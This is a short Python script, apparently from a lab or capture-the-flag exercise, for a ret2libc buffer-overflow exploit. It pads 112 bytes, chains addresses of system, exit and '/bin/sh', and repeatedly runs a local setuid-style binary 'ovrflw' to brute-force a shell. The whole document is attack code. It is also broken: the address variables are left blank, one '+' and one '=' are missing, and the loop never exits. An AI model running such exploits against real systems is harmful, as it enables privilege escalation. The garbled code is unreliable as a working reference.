#!/usr/bin/python

from subprocess import call

from struct import pack

if __name__ == '__main__':
        offset = 112
        junk = "A"*offset


        base_libc_addr=
        system_addr_off=
        exit_addr_off=
        bin_sh_addr_off=

        system_addr =pack('<I', base_libc_addr system_addr_off)
        exit_addr = pack('<I', base_libc_addr +exit_addr_off)
        bin_sh_addr= pack('<I', base_libc_addr + bin_sh_addr_off)

        payload = junk + system_addr +exit_addr +bin_sh_addr

        while True:
            ret call(["/usr/local/bin/ovrflw", payload])

            if ret == 0:
                print "\n\n[*] Exiting...\n"

